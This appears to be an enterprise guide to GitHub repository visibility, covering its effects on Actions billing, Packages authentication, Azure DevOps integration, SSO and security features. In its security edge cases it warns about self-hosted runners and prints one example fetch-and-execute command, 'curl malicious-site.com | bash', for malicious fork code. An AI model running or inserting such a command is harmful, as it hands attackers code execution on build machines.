# GitHub Repository Visibility: Enterprise Comparison Matrix

GitHub Enterprise organizations must navigate critical visibility decisions that ripple through every aspect of their development workflow—from Actions minutes billing to package authentication and Azure DevOps integration. **The core insight**: Internal repositories (Enterprise Cloud exclusive) offer the sweet spot for enterprises, enabling innersource collaboration while maintaining security boundaries, but this choice fundamentally affects Actions costs, Packages authentication patterns, and third-party integrations in ways most organizations don't anticipate.

Understanding these visibility implications prevents costly mistakes like accidentally exposing private packages through public workflows, misconfiguring Azure Pipelines authentication, or paying 10x more for macOS Actions minutes on private repos when internal visibility would suffice. This guide provides the technical depth needed for enterprise architects managing complex multi-repository architectures where visibility decisions cascade across CI/CD pipelines, package registries, and compliance requirements.

## Repository visibility fundamentals and access boundaries

GitHub provides three visibility types with dramatically different access models and enterprise availability. **Public repositories** expose code to everyone on the internet—anyone can view, clone, and fork without authentication. Search engines index the content, and repositories appear in GitHub's public listings. **Private repositories** restrict access exclusively to explicitly granted collaborators and organization members, remaining invisible to external users and search engines. **Internal repositories**, available only with GitHub Enterprise Cloud, create a middle ground where all enterprise members gain automatic read access while keeping code hidden from the outside world.

The critical enterprise differentiator lies in internal repositories' "innersource" model. Any user belonging to at least one organization within the enterprise automatically receives read permissions to all internal repositories, even if base permissions are set to "none." This minimum visibility level enables code discovery and reuse across organizational boundaries while maintaining proprietary protection. However, outside collaborators—even those with access to other repositories in the organization—cannot access internal repositories, creating clear security boundaries.

### Visibility access control comparison

| Access Pattern | Public | Private | Internal (Enterprise Only) |
|---|---|---|---|
| **Anonymous viewing** | Anyone on internet | No access | No access |
| **Cloning requirements** | No authentication needed | Explicit permission required | Enterprise membership required |
| **Search visibility** | Indexed by GitHub and search engines | Only to users with access | All enterprise members |
| **Default organization access** | Read by default | No default access unless base permissions set | Automatic read for all enterprise members |
| **Outside collaborators** | Full access | Can be granted explicit access | **Cannot access** (critical limitation) |
| **Forking behavior** | Anyone can fork; forks always public | Disabled by default; requires policy enablement | Enterprise members can fork; **single-level only** |
| **Fork inheritance** | Forks remain public in network | Private forks inherit permissions; removed if access revoked | Forks become private in user namespace; removed if user loses all org membership |

Enterprise Managed Users (EMU) impose additional restrictions: repositories in EMU enterprises can **only be private or internal**, never public. This prevents accidental exposure of proprietary code but eliminates the ability to contribute to open source projects from managed accounts.

### Visibility change consequences and policy enforcement

Changing repository visibility triggers cascading effects that permanently alter repository characteristics. Making a repository public **permanently erases stars and watchers**, affecting repository rankings irrecoverably. Public-to-private conversions cause all public forks to detach into separate networks and remain public. Private-to-public conversions disable all push rulesets and make Actions history visible to everyone, including workflow file paths that may reveal sensitive information.

Enterprise owners can restrict visibility changes at three policy levels: allowing members with admin access, restricting to organization owners only, or requiring enterprise owner approval (strictest). However, even with organizational restrictions, individuals with admin access can modify visibility if repository creation policies allow that visibility type—a critical security gap requiring layered policy enforcement.

## GitHub Actions workflow execution and billing implications

Repository visibility fundamentally determines GitHub Actions billing, security boundaries, and workflow execution patterns. **Public repositories receive unlimited free Actions minutes** using standard GitHub-hosted runners (2-core Linux), making them cost-effective for open source projects but introducing security risks. Private repositories consume billable minutes with OS-based multipliers: Linux at 1x ($0.008/minute), Windows at 2x, and macOS at 10x ($0.08/minute)—making a macOS workflow in a private repository 10 times more expensive than Linux.

Internal repositories in Enterprise Cloud follow private repository billing patterns but enable superior workflow sharing across the enterprise. The critical distinction: internal repositories can configure Actions and reusable workflows to be "accessible from repositories in the [ENTERPRISE] enterprise," allowing centralized CI/CD pipeline management without exposing workflows publicly or managing complex PAT authentication schemes.

### Actions workflow permissions and security matrix

| Capability | Public Repositories | Private Repositories | Internal Repositories |
|---|---|---|---|
| **Fork PR workflows** | Run automatically with read-only token, no secrets | Disabled by default; requires explicit enablement | Same as private |
| **GITHUB_TOKEN permissions** | Read-only for fork PRs; configurable for main branch | Fully configurable; fork PRs configurable | Fully configurable |
| **Organization secrets** | **NOT accessible** (security measure) | Accessible with proper scoping | Accessible with proper scoping |
| **Reusable workflow access** | Callable from any repository globally | Default: same repo only; configurable to org/enterprise | Configurable to org/enterprise; **cannot be used from public repos** |
| **Self-hosted runner security** | **Strongly not recommended** (malicious fork code execution risk) | Safer with proper network isolation | Safer with proper network isolation |
| **Workflow approval requirements** | Required for first-time contributors | Configurable for fork PRs | Configurable for fork PRs |
| **Actions marketplace access** | Full access to all public actions | Full access to all public actions | Full access to all public actions |
| **Private actions consumption** | Requires third-party loader with PAT (insecure) | Requires access configuration or PAT | Can use internal repos with access configured |

### Cross-repository workflow calling patterns

Reusable workflows introduce complex access patterns that vary dramatically by repository visibility. **Public reusable workflows** can be called from any repository (public, private, or internal) with billing charged to the caller's account, creating a centralized workflow model. **Private reusable workflows** default to same-repository-only access but can be configured to allow access from repositories owned by the same user or organization—however, they **cannot be used in public repositories** even when access is granted, preventing private workflow logic exposure.

**Internal reusable workflows** (beta feature) provide enterprise-wide availability when configured, accessible across all organizations within the enterprise. This enables centralized DevOps teams to maintain canonical CI/CD pipelines that product teams can consume without managing PATs or complex authentication. The critical limitation: reusable workflows support a maximum depth of 4 levels, and secrets only pass to directly called workflows, not transitively through nested calls.

### Secrets and environment access security boundaries

Organization-level secrets demonstrate visibility's security implications: they are **explicitly not accessible from public repositories by default**, preventing accidental exposure when repositories are made public. Private and internal repositories have full access to organization secrets when properly scoped. Environment secrets add another complexity layer—they **cannot be inherited via workflow_call** and must be defined at the job level where the environment context is declared.

Fork pull request workflows in public repositories never receive secrets access, running with read-only GITHUB_TOKEN regardless of settings. Private repository fork workflows can be configured to receive secrets via three independent settings: "Run workflows from fork pull requests" (read-only, no secrets), "Send write tokens to workflows from pull requests" (elevated access), and "Send secrets to workflows from pull requests" (full access). This granular control enables secure fork collaboration in private repositories where fork contributors are trusted.

### Actions billing optimization and cost considerations

| Plan | Monthly Minutes (Private/Internal) | Storage | Public Repo Minutes |
|---|---|---|---|
| GitHub Free | 2,000 Linux-equivalent | 500 MB | Unlimited (standard runners) |
| GitHub Pro | 3,000 Linux-equivalent | 1 GB | Unlimited (standard runners) |
| GitHub Team | 50,000 Linux-equivalent | 2 GB | Unlimited (standard runners) |
| GitHub Enterprise | Usage-based | Custom | Unlimited (standard runners) |

**Critical billing principle**: Usage is charged to the repository owner's account, not the user triggering the workflow. Fork pull requests to public repositories bill the base repository owner, not the fork owner. Reusable workflows always bill the caller's account, evaluated from the caller's context for runner assignment—meaning you cannot use a public repository's free minutes by calling its workflow from a private repository.

Self-hosted runners eliminate minute charges entirely but require organizations to bear infrastructure costs. Artifact storage remains billable at $0.008/GB/day regardless of runner type, with hourly usage calculation. Cost optimization strategies include using appropriate OS (Linux over macOS when possible), aggressive dependency caching, concurrency groups to cancel redundant runs, and strategic artifact retention policies (1-400 days configurable for private repos, default 90 days).

## GitHub Packages visibility inheritance and authentication patterns

GitHub Packages implements two fundamentally different permission models depending on registry type, creating critical integration considerations. **Granular permission registries** (Container, npm, NuGet, RubyGems) allow packages to have visibility and permissions independent from repositories, while **repository-scoped registries** (Maven, Gradle) always inherit repository visibility and permissions with no separation possible.

The Container registry stands alone with a critical enterprise advantage: **public containers allow anonymous access without authentication**, enabling public package consumption without PAT management. All other registries—even for public packages—require authentication via PAT or GITHUB_TOKEN, complicating public package consumption patterns. This creates an asymmetry where publishing public npm packages to GitHub Packages provides limited value compared to Container registry's true public access model.

### Package visibility and access authentication requirements

| Registry Type | Visibility Options | Public Package Access | Private Package Access | Repository Permission Inheritance |
|---|---|---|---|---|
| **Container (ghcr.io)** | Public, Private, Internal | **Anonymous (no auth)** | Requires read:packages PAT or GITHUB_TOKEN | Optional; configurable |
| **npm** | Public, Private, Internal | Requires authentication | Requires read:packages PAT or GITHUB_TOKEN | Optional; configurable |
| **NuGet** | Public, Private, Internal | Requires authentication | Requires read:packages PAT or GITHUB_TOKEN | Optional; configurable |
| **RubyGems** | Public, Private, Internal | Requires authentication | Requires read:packages PAT or GITHUB_TOKEN | Optional; configurable |
| **Maven** | Follows repository | Requires authentication | Requires read:packages PAT or GITHUB_TOKEN | **Always inherited; not separable** |
| **Gradle** | Follows repository | Requires authentication | Requires read:packages PAT or GITHUB_TOKEN | **Always inherited; not separable** |

### Package visibility inheritance mechanics and edge cases

Package visibility inheritance operates through a subtle mechanism that catches many enterprises off guard. When publishing a package **linked to a repository before publication** (via Docker `org.opencontainers.image.source` label or package manifest `repository` field), the package automatically inherits **access permissions** (read/write/admin levels) but **NOT visibility** (public/private/internal). This means publishing from a private repository doesn't automatically create a private package—visibility must be set explicitly.

Connecting a package to a repository after publication does NOT automatically inherit permissions unless explicitly selected via "Inherit access from repository" option in Package Settings. Organizations can disable automatic inheritance enterprise-wide for all new packages, requiring explicit permission management. When repositories transfer ownership, package links break: for granular permission registries, packages remain with the original owner but lose repository connection; for repository-scoped registries (Maven, Gradle), packages transfer with the repository.

### Cross-repository package consumption patterns and authentication

The "Manage Actions access" feature transforms cross-repository package consumption for granular permission registries. Adding consuming repositories to this list enables workflows to use **GITHUB_TOKEN** for package authentication instead of PATs, significantly improving security posture. Workflows must declare appropriate permissions (`packages: read`) to access granted packages. This mechanism only works within the same organization—cross-organization consumption always requires PAT authentication.

**Maven and Gradle's repository-scoped limitation** eliminates the "Manage Actions access" option entirely, forcing cross-repository consumption to use PATs even within the same organization. This architectural constraint makes these registries significantly less flexible for enterprise microservice architectures where multiple services depend on shared libraries. Workarounds include creating dedicated CI/CD bot accounts with PATs stored as organization secrets, but this introduces credential rotation challenges.

### Cost implications and storage billing model

| Visibility | Storage Cost | Data Transfer Cost | Container Registry Cost |
|---|---|---|---|
| **Public packages** | **FREE (unlimited)** | **FREE (unlimited)** | **Currently FREE** (subject to change with notice) |
| **Private/Internal packages** | $0.008/GB/day beyond quota | $0.50/GB beyond quota | **Currently FREE** (subject to change with notice) |

Storage attribution applies to the repository owner (not package publisher). Publishing multiple package versions accumulates storage costs—a 500MB package updated to a new 500MB version consumes 1GB total storage. Data transfer within GitHub Actions workflows using GITHUB_TOKEN is **free and doesn't count against transfer limits**, making Actions-based package consumption significantly more cost-effective than external downloads.

### Private package consumption in public repositories security implications

Granting public repositories access to private packages creates a critical security consideration: **public repository forks may gain access to private packages**. GitHub warns about this when configuring access, but the implications are severe for open source projects with private dependencies. Fork contributors could potentially exfiltrate private package contents by modifying workflows to log package contents or upload them elsewhere.

Mitigation strategies include reviewing fork access regularly, implementing branch protection rules requiring approval for workflow changes, considering approval workflows for external contributors (using `pull_request_target` carefully), and monitoring package download analytics for unusual patterns. For highly sensitive packages, consider using internal repositories instead of private with public repository access, as internal visibility provides better access boundaries for enterprise scenarios.

## Azure DevOps integration architecture and authentication methods

Azure DevOps integration with GitHub repositories operates independently from GitHub visibility settings but requires different authentication approaches based on repository access requirements. The integration supports three primary authentication methods, each with distinct security, maintenance, and enterprise-readiness characteristics that significantly impact long-term operational overhead.

### Service connection authentication method comparison

| Method | Identity Model | Enterprise SSO Support | Maintenance Overhead | Security Level | Best Use Case |
|---|---|---|---|---|
| **GitHub App** | App identity (recommended) | Yes via org configuration | Low (automatic token refresh) | High | Production CI/CD pipelines |
| **OAuth** | Personal user identity | Limited | Medium (user account dependency) | Medium | Personal/development scenarios |
| **Personal Access Token (PAT)** | Personal user identity | Yes with SSO authorization | High (manual rotation required) | Medium-High | Automation with granular control |
| **Azure AD Integration** | Corporate identity | Native | Low | Highest | Enterprise with federated identity |

**GitHub App authentication** provides the most robust enterprise pattern: installed from the Azure Pipelines GitHub Marketplace app, it operates with app identity rather than personal credentials, preventing pipeline failures when users leave the organization. The app requires specific permissions including write access to code (for YAML commits only), read access to metadata, and read/write access to checks and pull requests. Critically, it supports GitHub Checks API for superior status reporting compared to basic OAuth commit statuses.

**PAT authentication** offers granular control but introduces rotation overhead. Required scopes include `repo`, `admin:repo_hook`, `read:user`, and `user:email`. For SAML SSO-enabled organizations, PATs must be separately authorized for SSO—a frequently missed configuration step causing authentication failures. PATs expire (recommended 90-day maximum), requiring coordination between GitHub token management and Azure DevOps service connection updates. Enterprise teams typically create dedicated service accounts with PATs to avoid tying automation to individual user accounts.

### Azure Pipelines repository triggers and branch policies

Azure Pipelines fully supports all three GitHub visibility types (public, private, internal/GHE) with comprehensive trigger capabilities. Automatic triggering on commits and pull requests works across visibility types, though fork PR behavior differs. **Public repositories** face security considerations: fork PRs can trigger workflows, but organizations must configure approval requirements ("Require approval for all outside collaborators" or "Require approval for first-time contributors") to prevent malicious code execution.

**Private repository fork workflows** in Azure Pipelines differ from GitHub Actions—they follow the same disable-by-default pattern but offer different configuration granularity. Starting with Sprint 229 (2023), Azure Pipelines requires explicit configuration for fork builds with options to disable entirely or require PR comments from team members (e.g., `/azp run` or `/AzurePipelines run`) to trigger builds. This comment-triggered approach provides security-conscious review without preventing fork collaboration.

### Azure Boards integration with GitHub artifacts

Azure Boards integration creates bidirectional linking between GitHub commits, pull requests, branches, and Azure DevOps work items using `AB#[work-item-id]` syntax in commit messages. The critical limitation: **a GitHub repository can connect to only ONE Azure DevOps organization**. Multiple organizations connecting the same repository causes conflicts where AB# mentions become ambiguous, potentially linking work items in unintended organizations.

Integration uses either the Azure Boards App for GitHub (recommended, app identity) or OAuth connection (personal identity). The app supports up to 500 repositories per connection in Azure DevOps Services (100 repositories in older versions). Operational behavior includes automatic work item linking when commits mention `AB#123`, automatic work item state transitions using "Fixes AB#456" syntax in PR descriptions (transitions to Done on merge), and GitHub Checks display in PR conversation tabs.

**Visibility considerations**: Azure Boards integration works identically across public, private, and internal repositories once authenticated. However, public repository integration exposes work item IDs in commit messages to everyone, potentially revealing sprint planning or feature roadmaps. Organizations must balance transparency benefits against competitive intelligence exposure when integrating public repositories.

### Azure Repos mirroring and synchronization patterns

Azure Repos lacks native bidirectional synchronization with GitHub, requiring custom implementation patterns. The most common approach uses **pipeline-based synchronization** with scheduled triggers or webhook activation. Organizations typically establish one repository as the primary source of truth and implement one-way sync to secondary locations, as bidirectional sync introduces complex merge conflict resolution requirements.

Pipeline-based sync pattern example requirements:
- Primary repository webhook triggers sync pipeline
- Pipeline checks out with `persistCredentials: true`
- Adds remote repository as Git remote
- Fetches and pushes changes (typically with `--force` for simplicity)
- Handles authentication via pipeline variables containing PATs

**Critical consideration**: Git mirror operations using `git push --mirror` replicate all branches and tags, potentially exposing feature branches or experimental work not intended for cross-platform visibility. Organizations must carefully scope which branches synchronize based on repository visibility policies. The alternative Azure Repos import feature provides one-time migration only, not ongoing synchronization.

### Webhook configuration and network connectivity requirements

**GitHub webhooks to Azure DevOps** are automatically created by Azure Pipelines service connections, using format `https://dev.azure.com/org/_apis/public/distributedtask/webhooks/[name]`. These webhooks trigger on push, pull_request, and issue_comment events. Despite public URL format, secret validation (stored in service connection configuration) provides security using HMAC-SHA256 signature verification.

Visibility-specific webhook considerations:
- **Public repositories**: Webhook URLs should still use secrets despite public access; implement IP whitelisting to prevent unauthorized trigger attempts
- **Private repositories**: Stricter secret management required; service connections must have appropriate GitHub permissions; OAuth connections require organization access grants
- **Internal repositories (GHE)**: Server URL must be resolvable from Azure DevOps; may require VPN or ExpressRoute for on-premises GHE; DNS records must point correctly for both internal and external access; additional firewall rules for Azure DevOps IP ranges

Azure DevOps IP addresses requiring whitelisting are documented at the allow-list documentation (service tag `AzureDevOps` for NSG rules). GitHub webhook source IPs are available via `https://api.github.com/meta` for dynamic firewall configuration.

### Service connection security hardening and permission management

Enterprise-grade Azure Pipelines integration requires careful service connection security configuration beyond authentication setup. The critical security principle: **disable "Grant access permission to all pipelines"** and explicitly authorize each pipeline for service connection use. This prevents newly created or modified pipelines from accessing production GitHub resources without approval.

**Branch control checks** on service connections restrict usage to specific branches (e.g., `main` and `release/*` only), preventing service connection use from unreviewed feature branches. This protects against scenarios where developers might add malicious steps to feature branch pipelines that could exfiltrate credentials or modify production repositories. Approval gates for production service connections require designated reviewers to approve before pipeline execution proceeds.

Pipeline-specific permissions use Azure DevOps security groups (Readers, Contributors, Administrators) with granular control. For sensitive operations, required reviewers provide manual intervention points. Audit logging tracks service connection usage, capturing which pipelines accessed which connections, when, and by whom—critical for compliance investigations and security incident response.

### Enterprise SSO and Azure AD SAML integration architecture

GitHub Enterprise SAML SSO with Azure AD creates a layered authentication architecture where users authenticate to GitHub using Azure AD credentials while Azure DevOps integration operates independently. **Configuration flow**:

1. Create Enterprise Application in Azure AD ("GitHub Enterprise Cloud - Organization")
2. Configure SAML SSO settings with Sign-on URL: `https://github.com/orgs/[ORG]/sso`
3. Set Identifier: `https://github.com/orgs/[ORG]` and Reply URL: `https://github.com/orgs/[ORG]/saml/consume`
4. Generate base64 certificate and configure SHA-256 signature method
5. Enable SAML in GitHub organization settings with Azure AD URLs and certificate
6. Test and enforce SSO for organization

**Critical integration consideration**: Azure DevOps service connections work independently of GitHub SSO. PATs must be **separately authorized for SSO in GitHub** after creation—users navigate to GitHub Personal Access Token settings and click "Configure SSO" next to the organization, then authorize. This separate authorization step frequently causes service connection authentication failures when initially configuring SAML-enabled organizations.

**Enterprise Managed Users (EMU)** with Azure AD introduce centralized identity management via SCIM provisioning. Users are created with format `username_shortcode` (e.g., `john_acmecorp`) and provisioned automatically through IdP. EMU users cannot modify profile information (controlled by IdP) and cannot contribute to repositories outside the enterprise. Azure DevOps integration with EMU enterprises requires GitHub App or PAT authentication from managed user accounts, with service accounts often needed for automation to prevent user lifecycle issues.

## Enterprise-specific governance, compliance, and security features

GitHub Enterprise introduces sophisticated visibility control, compliance, and security capabilities that extend far beyond basic public/private repository options. Enterprise Managed Users (EMU) represent the strictest security posture, fundamentally changing how organizations approach repository visibility and user access at the cost of open source contribution capabilities.

### GitHub Enterprise Cloud vs Server architectural differences

| Feature | Enterprise Cloud (GHEC) | Enterprise Server (GHES) |
|---|---|---|
| **Hosting** | GitHub.com infrastructure | Self-hosted on-premises or private cloud |
| **Internal repositories** | Available (default for new repos) | Available GHES 2.20+ |
| **Public repositories** | Available (unless EMU) | Available unless private mode enabled |
| **Maintenance** | Fully managed SaaS | Manual patching, updates, infrastructure management |
| **GitHub Pages visibility** | Private (org members only) | Configurable based on instance settings |
| **Data residency** | Available (EU, Australia, US) | Full control via deployment location |
| **Authentication** | EntraID/Okta SSO, SAML, OIDC | LDAP, local auth, SAML |
| **API endpoints** | github.com or subdomain.ghe.com | Custom instance URL |
| **Feature updates** | Immediate | Delayed by release schedule (quarterly) |

**Internal repository migration**: GHES 2.20+ provides migration tools to convert public repositories to internal when enabling private mode, preserving innersource capabilities while restricting external access. GHEC defaults to internal visibility for new repositories in enterprise accounts, actively promoting innersource collaboration patterns over traditional private repository isolation.

### Organization-level visibility policies and enforcement

Enterprise owners establish visibility governance through layered policy enforcement affecting all organizations. **Repository creation policies** can restrict members to specific visibility types (allowing/disallowing public, private, or internal creation) or limit repository creation to organization owners entirely. EMU enterprises automatically prevent public repository creation and changing any repository to public visibility, enforcing proprietary code protection at the platform level.

**Base repository permissions** (None, Read, Write, Admin) can be enforced enterprise-wide or delegated to organization owners. The critical exception: internal repositories maintain minimum "read" visibility even when base permissions are set to "none," ensuring enterprise members can always discover and access internal repositories for innersource purposes. This minimum visibility cannot be overridden, creating a fundamental difference between internal and private repositories.

**Visibility change restrictions** operate at three policy levels:
- **Allow members with admin access**: Default flexibility, higher risk
- **Restrict to organization owners**: Balanced control for most enterprises
- **Restrict to enterprise owners**: Maximum control for highly regulated industries

However, a critical security gap exists: even when organizations restrict visibility changes to owners, individuals with admin access can still modify visibility if repository creation policies allow creation of repositories with that visibility type. This requires coordinated policy enforcement across creation and modification controls.

### Repository template limitations and workarounds

Repository templates appear to support visibility inheritance but actually provide surprisingly limited configuration transfer. Templates copy directory structure, files, and commit history from the default branch (or all branches if selected) but **do not inherit**:
- Repository settings (protected branches, branch rules, required reviewers)
- Organization-level security settings
- Labels, issue templates, and project boards
- GitHub Apps marketplace integrations
- Access permissions or visibility settings
- Branch protection rules or policies

This limitation forces enterprises to implement post-creation automation using GitHub Actions workflows or organization-level rulesets (Beta, Enterprise only) that apply settings to repositories matching naming patterns or other criteria. Many organizations maintain infrastructure-as-code repositories using Terraform GitHub Provider or similar tools to standardize repository configuration beyond template capabilities.

**Package visibility inheritance** operates through the separate mechanism described earlier: packages linked to repositories before publication automatically inherit repository access permissions (but not visibility) unless organizations disable automatic inheritance enterprise-wide.

### Audit logging architecture and compliance capabilities

Enterprise audit logs retain events for **180 days** (Git events for 7 days only) with default display showing the last 3 months. Older events require explicit date range queries. Enterprise owners and organization owners have access, with comprehensive export capabilities via JSON/CSV for offline analysis and long-term archival beyond the 180-day retention window.

**Real-time audit log streaming** transforms compliance monitoring by sending events to external SIEM systems:
- Splunk HTTP Event Collector
- Azure Event Hubs
- AWS S3 buckets
- Google Cloud Storage
- Datadog API

Streaming enables immediate security alerting, compliance dashboards, and incident response workflows without polling APIs or waiting for exports. For regulated industries requiring 7-year audit retention, streaming to immutable storage provides compliant archival.

### Visibility-specific audit events and security monitoring

| Event Category | Key Events | Visibility Implications |
|---|---|---|
| **Visibility changes** | `repo.access`, `repository_visibility_change.disable` | Tracks all visibility modifications; critical for preventing accidental exposure |
| **Repository creation** | `repo.create` (captures visibility type) | Monitors new repository visibility selections; alerts on policy violations |
| **Permission changes** | `org.update_member_repository_creation_permission` | Tracks who can create repositories with which visibility types |
| **SAML authentication** | `business.sso_response`, `business.revoke_sso_session` | Links corporate identity to GitHub activity; critical for EMU |
| **Advanced Security** | `business_advanced_security.enabled`, `business_secret_scanning.*` | Monitors security feature enablement by repository visibility |

**EMU-specific audit enhancement**: Enterprise Managed Users audit logs include user-level events (login events, identity linking, external identity revocations) that standard GHEC audit logs omit. This provides complete visibility into managed account lifecycle and activity, critical for compliance in regulated industries.

### IP allowlists and network security boundaries

IP allowlists protect private and internal repositories, organization resources, API access, and Git operations while **not protecting** public repository browsing or anonymous access to public content. This creates an important security boundary: public repositories remain accessible for viewing regardless of IP allowlist configuration, but authenticated operations (push, pull from private sections) require allowlisted IPs.

**Enforcement scope**:
- Enterprise-level allowlists apply to all organizations (cannot be overridden)
- Organization-level allowlists build upon enterprise-inherited entries
- Self-hosted Actions runners must add their IP addresses
- GitHub Pages custom workflows require IP allowlist configuration

**Critical limitations**: Organizations with IP allowlists **cannot use GitHub Codespaces**—an absolute incompatibility with no current workaround. This forces organizations to choose between network security posture and developer environment flexibility. IPv6 support is gradually rolling out, requiring proactive IPv6 address additions to prevent access interruptions as services migrate.

**EMU corporate proxy restrictions** (Public Preview) provide network-level access control where corporate proxies inject enterprise-specific headers into requests. GitHub blocks requests without proper headers, enforcing traffic flow through approved network paths. This complements IP allowlists with positive security model verification rather than solely IP-based allowlisting.

### Third-party application access control and OAuth management

OAuth app authorization requires explicit user consent for requested scopes (e.g., `user:email`, `repo`, `admin:org`). **SAML SSO organizations** require additional authorization where users with active SAML sessions must separately authorize OAuth apps for each organization. PATs and SSH keys must also be SSO-authorized before use—a separate step in GitHub settings that frequently causes authentication failures when first implementing SAML.

Organization-level OAuth app access restrictions prevent apps from accessing organization resources until explicitly approved by organization owners. When enabled, users can request approval but cannot grant automatic access. This prevents unauthorized third-party applications from accessing private repositories and organization data, critical for compliance in healthcare, finance, and government sectors.

**EMU OAuth and GitHub App limitations**: Applications created in EMU enterprises are enterprise-scoped only—they cannot be made public to the wider GitHub community. EMU user accounts cannot install GitHub Apps from the marketplace, creating a restricted third-party ecosystem. Organizations must plan for limited integration options or develop custom GitHub Apps for internal use. Enterprise owners can view and control all installed applications across the enterprise.

### GitHub Advanced Security features by repository visibility

| Security Feature | Public Repositories | Private/Internal (Free) | Private/Internal (Code Security License) |
|---|---|---|---|
| **Dependency graph** | ✅ Free | ✅ Free | ✅ Included |
| **Dependabot alerts** | ✅ Free | ✅ Free | ✅ Enhanced with custom auto-triage |
| **Secret scanning (partner patterns)** | ✅ Free | ❌ Not available | ✅ Included (Secret Protection license) |
| **Secret scanning (custom patterns)** | ❌ Not available | ❌ Not available | ✅ Included (Secret Protection license) |
| **Push protection** | ❌ Not available | ❌ Not available | ✅ Included (Secret Protection license) |
| **Code scanning (CodeQL)** | ✅ Free, enabled by default | ❌ Not available | ✅ Included (Code Security license) |
| **Dependency review** | Limited | Limited | ✅ Full access with PR blocking |
| **Security overview dashboard** | ❌ Not available | ❌ Not available | ✅ Enterprise-level visibility |
| **Copilot Autofix** | ❌ Not available | ❌ Not available | ✅ Included with Code Security |

Public repositories gain Advanced Security features automatically and freely, making open source projects security-rich without licensing costs. Private and internal repositories require **GitHub Code Security or Secret Protection licenses** for advanced features, with enterprise-level policy configuration controlling default enablement for new repositories.

**Enterprise policy options** enable administrators to set default security configurations: enable for all new repositories, disable for new repositories, or delegate choice to organization owners. This creates consistency across the enterprise while allowing flexibility for specific organizational needs. Audit events track security feature enablement changes: `business_advanced_security.enabled`, `business_secret_scanning.enable`, `business_dependabot_alerts.enable`.

### Data residency and sovereign cloud compliance

**GitHub Enterprise Cloud with Data Residency** deploys multi-tenant enterprise SaaS on Microsoft Azure infrastructure with regional data storage choices: European Union, Australia, or United States (supporting FedRAMP Moderate pursuit). Organizations receive dedicated subdomains (e.g., `acmecorp.ghe.com`) isolated from github.com to prevent data mixing.

**Data stored in chosen region**:
- Git repository data (code, history, blobs)
- Git Large File Storage (LFS)
- User and organizational data
- Audit logs
- GitHub Actions logs and artifacts
- GitHub Packages
- GitHub Pages content

**Data potentially stored outside region**:
- Aggregated telemetry (no PII)
- Support tickets containing code samples
- TLS certificate information (sent to Certificate Authorities)
- CDN cache for performance optimization
- Backup replicas for disaster recovery

**Critical requirement**: Data residency enterprises **must use Enterprise Managed Users (EMU)**. Personal GitHub accounts cannot be used, enforcing complete identity management through IdP with SCIM provisioning. This combination provides maximum data control but eliminates open source contribution capabilities from managed accounts.

Data residency supports compliance frameworks including GDPR (EU), CCPA (US), and positions for FedRAMP Moderate authorization (US region). The dedicated subdomain architecture isolates enterprise data from github.com's multi-tenant environment, providing clear data sovereignty boundaries for regulated industries.

## Enterprise architecture decision framework and edge cases

Enterprise repository visibility decisions cascade through authentication patterns, billing models, and operational complexity in ways that surprise most organizations during initial GitHub Enterprise adoption. The following decision framework and edge case catalog prevent costly architectural mistakes.

### Visibility selection decision matrix

| Use Case | Recommended Visibility | Rationale | Critical Considerations |
|---|---|---|---|
| **Open source projects** | Public | Community engagement, free Actions/GHAS | Cannot protect IP; careful secrets management required |
| **Proprietary applications** | Private (standard) | Explicit access control | Higher Actions costs; organization secrets accessible |
| **Shared internal libraries** | Internal (Enterprise) | Automatic enterprise discovery | Requires Enterprise Cloud; outside collaborators cannot access |
| **Highly regulated data** | Private + EMU | Maximum control; compliance-ready | Cannot contribute to public repos; limited third-party apps |
| **Vendor collaboration** | Private with explicit grants | Granular outside collaborator control | Actions costs; IP allowlists may block vendor access |
| **Open source forks with modifications** | Internal (Enterprise) | Innersource with upstream visibility | Consider public if benefiting upstream community |

### Actions billing and visibility edge cases

**Edge case**: Public repository calling reusable workflow from private repository—billing charges the public repository owner (caller) even though the workflow logic resides in a private repository consuming billable minutes. Organizations cannot "hide" expensive workflow logic in public repositories to avoid costs.

**Edge case**: Private repository with macOS Actions consuming 10x minute multiplier creates outsized billing impact. A 30-minute macOS workflow consumes 300 Linux-equivalent minutes from monthly quota. Organizations with macOS builds in private repositories should strongly consider:
1. Using internal visibility instead (if Enterprise Cloud available)—billing remains the same but enables better workflow sharing
2. Moving macOS-specific steps to separate jobs with restrictive path filters
3. Implementing comprehensive caching to minimize macOS execution time
4. Using self-hosted macOS runners (no minute charges) for high-volume scenarios

**Edge case**: Fork pull requests to public repositories with self-hosted runners create severe security risk. Forks can modify workflows to execute malicious code (`curl malicious-site.com | bash`) on the self-hosted infrastructure. GitHub **strongly recommends against** self-hosted runners for public repositories. Organizations wanting community contributions must use GitHub-hosted runners exclusively or implement strict approval workflows with security review.

### Package registry visibility and authentication challenges

**Edge case**: Maven package published from private repository requires PAT authentication for consumption even within the same organization. Unlike npm/Container registries with "Manage Actions access" functionality, Maven's repository-scoped permissions eliminate this capability. Workaround requires creating dedicated CI/CD service accounts with PATs containing `read:packages` scope, stored as organization secrets, and accessed via `secrets.PACKAGES_PAT` in workflows.

**Edge case**: Public package in npm registry still requires authentication for consumption (unlike Container registry). Organizations publishing npm packages publicly for community use face friction where consumers must create GitHub accounts and configure `.npmrc` files with authentication, reducing adoption compared to npmjs.org. Container registry's anonymous public access makes it the only truly friction-free public package option on GitHub Packages.

**Edge case**: Making repository public does not automatically make linked packages public. A package published while the repository was private retains private visibility even when the repository becomes public. Organizations must manually change package visibility in Package Settings. Conversely, making a repository private does not make public packages private—packages cannot revert from public to private (irreversible security decision).

**Edge case**: Granting public repository access to private packages enables fork access risk. When adding a public repository to private package's "Manage Actions access," forks of that public repository may gain indirect access during workflow execution. Malicious fork contributors could exfiltrate package contents by modifying workflows to upload package files elsewhere. Mitigation requires fork workflow approval and careful monitoring of workflow changes.

### Azure DevOps integration authentication failures

**Edge case**: SAML SSO-enabled organization with PAT-based Azure DevOps service connection fails authentication after initial success. Root cause: PATs in SAML organizations require separate SSO authorization in GitHub settings (Settings → Personal Access Tokens → Configure SSO). This authorization can expire or be revoked by organization policy changes. Resolution requires re-authorizing PAT for SSO, then updating Azure DevOps service connection if token was rotated.

**Edge case**: GitHub App service connection to GitHub Enterprise Server fails with "remote name could not be resolved." Enterprise Server instances require bidirectional HTTPS connectivity between Azure DevOps and GHE server with proper DNS resolution. On-premises GHE behind corporate firewalls requires Azure DevOps IP ranges whitelisted and VPN/ExpressRoute connectivity for Azure DevOps hosted agents. Alternative: Deploy self-hosted Azure Pipelines agents within GHE network boundary.

